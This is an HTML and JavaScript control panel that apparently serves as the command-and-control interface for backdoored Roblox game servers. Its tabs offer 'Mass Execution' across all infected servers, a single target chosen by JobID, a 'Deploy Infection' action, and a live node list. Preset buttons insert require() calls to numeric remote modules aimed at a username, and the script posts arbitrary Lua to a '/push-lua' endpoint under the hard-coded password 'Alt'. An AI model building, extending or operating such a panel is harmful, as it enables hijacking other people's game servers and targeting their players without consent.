<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nexus  | Legacy Expanded</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .panel { background: #1c1c1e; padding: 30px; border-radius: 18px; width: 550px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .tabs { display: flex; justify-content: center; gap: 20px; margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 10px; }
        .tab { color: #86868b; cursor: pointer; font-size: 13px; font-weight: 500; transition: 0.2s; position: relative; }
        .tab.active { color: #fff; }
        .tab.active::after { content: ''; position: absolute; bottom: -11px; left: 0; width: 100%; height: 2px; background: #0071e3; }
        .content-section { display: none; }
        .content-section.active { display: block; }
        h2 { margin-top: 0; font-weight: 600; font-size: 18px; text-align: center; margin-bottom: 15px; }
        .btn-group { display: flex; gap: 6px; margin-bottom: 15px; flex-wrap: wrap; justify-content: center; }
        .pill { background: #3a3a3c; border: none; color: #fff; padding: 8px 14px; border-radius: 20px; font-size: 10px; cursor: pointer; transition: 0.2s; }
        .pill:hover { background: #0071e3; }
        textarea, input { width: 100%; background: #000; border: 1px solid #424245; border-radius: 10px; color: #fff; padding: 12px; margin-bottom: 12px; box-sizing: border-box; font-family: monospace; outline: none; font-size: 12px; }
        .exec-btn { background: #0071e3; color: #fff; border: none; width: 100%; padding: 14px; border-radius: 12px; font-weight: 600; cursor: pointer; font-size: 15px; margin-top: 5px; }
        .node-list { background: #000; border: 1px solid #333; border-radius: 10px; height: 150px; overflow-y: auto; padding: 10px; font-size: 11px; }
        .footer-btns { position: fixed; bottom: 20px; left: 20px; display: flex; gap: 10px; }
        .f-btn { background: #2c2c2e; border: none; color: #fff; padding: 8px 16px; border-radius: 10px; font-size: 12px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="panel">
        <div class="tabs">
            <span class="tab active" onclick="openTab(event, 'mass')">Mass</span>
            <span class="tab" onclick="openTab(event, 'single')">Single</span>
            <span class="tab" onclick="openTab(event, 'inf')">Infection</span>
            <span class="tab" onclick="openTab(event, 'nodes')">Nodes</span>
        </div>

        <input type="text" id="target_user" placeholder="Target Username (Admin/Whitelist)">

        <div id="mass" class="content-section active">
            <h2>Mass Execution</h2>
            <div class="btn-group">
                <button class="pill" onclick="setLua('LR', 'lua_mass')">Last Rig</button>
                <button class="pill" onclick="setLua('Darius', 'lua_mass')">Darius</button>
                <button class="pill" onclick="setLua('Steve', 'lua_mass')">Steve</button>
                <button class="pill" onclick="setLua('DS', 'lua_mass')">DarkSynapse</button>
                <button class="pill" onclick="setLua('EXE', 'lua_mass')">Require.EXE</button>
            </div>
            <textarea id="lua_mass" rows="6" placeholder="-- Global Lua"></textarea>
            <button class="exec-btn" onclick="fire('mass')">Execute All</button>
        </div>

        <div id="single" class="content-section">
            <h2>Single Target</h2>
            <div class="btn-group">
                <button class="pill" onclick="setLua('Darius', 'lua_single')">Darius</button>
                <button class="pill" onclick="setLua('Steve', 'lua_single')">Steve</button>
            </div>
            <input type="text" id="job_id" placeholder="Paste JobID Manually">
            <textarea id="lua_single" rows="5" placeholder="-- Target Lua"></textarea>
            <button class="exec-btn" onclick="fire('single')">Execute Target</button>
        </div>

        <div id="inf" class="content-section">
            <h2>Infection</h2>
            <textarea id="lua_inf" rows="8">require(127445614272366).op("Player")</textarea>
            <button class="exec-btn" onclick="fire('inf')">Deploy Infection</button>
        </div>

        <div id="nodes" class="content-section">
            <h2>Active Nodes</h2>
            <div id="node_display" class="node-list">Scanning for active servers...</div>
            <button class="exec-btn" style="background:#333; margin-top:10px;" onclick="refreshNodes()">Refresh Nodes</button>
        </div>
    </div>

    <div class="footer-btns">
        <button class="f-btn" onclick="document.getElementById('m').play()">PLAY</button>
        <button class="f-btn" style="color: #ff3b30;" onclick="document.getElementById('m').pause()">STOP</button>
    </div>

    <audio id="m" loop src="https://cdn.discordapp.com/attachments/1459510270870421546/1492178549317308426/Wont_Stop_Us_-_StacyBurke92_g00byd0lan_KLICKAUD.mp3?ex=69da6311&is=69d91191&hm=f174788afceacbba804576a6c0e91386a5e3a077bacbedbc981032a8ec393a1c&"></audio>

    <script>
        function openTab(evt, tabName) {
            var i, content, tabs;
            content = document.getElementsByClassName("content-section");
            for (i = 0; i < content.length; i++) { content[i].style.display = "none"; }
            tabs = document.getElementsByClassName("tab");
            for (i = 0; i < tabs.length; i++) { tabs[i].className = tabs[i].className.replace(" active", ""); }
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.className += " active";
        }

        function setLua(type, boxId) {
            const user = document.getElementById('target_user').value || "Player";
            const box = document.getElementById(boxId);
            if(type === 'LR') box.value = `require(132155655397653)("${user}")`;
            if(type === 'Darius') box.value = `require(127445614272366).op("${user}")`;
            if(type === 'Steve') box.value = `require(12246001294):Blockify("${user}")`;
            if(type === 'DS') box.value = `require(133245855072069)("${user}", "DarkSynapse")`;
            if(type === 'EXE') box.value = `require(125992639027440)["Require.EXE by E God"]("${user}")`;
        }

        async function fire(mode) {
            let code = "";
            let tid = null;

            if(mode === 'mass') code = document.getElementById('lua_mass').value;
            if(mode === 'single') {
                code = document.getElementById('lua_single').value;
                tid = document.getElementById('job_id').value;
            }
            if(mode === 'inf') code = document.getElementById('lua_inf').value;

            try {
                const res = await fetch('/push-lua', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        lua: code,
                        password: "Alt",
                        targetId: tid
                    })
                });
                if(res.ok) alert("Dispatched!");
                else alert("Server Error (Alt Password Failed)");
            } catch(e) {
                alert("Connection Failed. Is Render Awake?");
            }
        }

        async function refreshNodes() {
            try {
                const res = await fetch('/get-games');
                const data = await res.json();
                const display = document.getElementById('node_display');
                display.innerHTML = Object.keys(data).map(k => `<div><b>${data[k].name || 'Node'}</b><br><small style="color:#0071e3">${k}</small></div><hr style="border:0;border-top:1px solid #333">`).join('') || "No nodes found.";
            } catch(e) {}
        }

        setInterval(refreshNodes, 5000);
    </script>
</body>
</html>
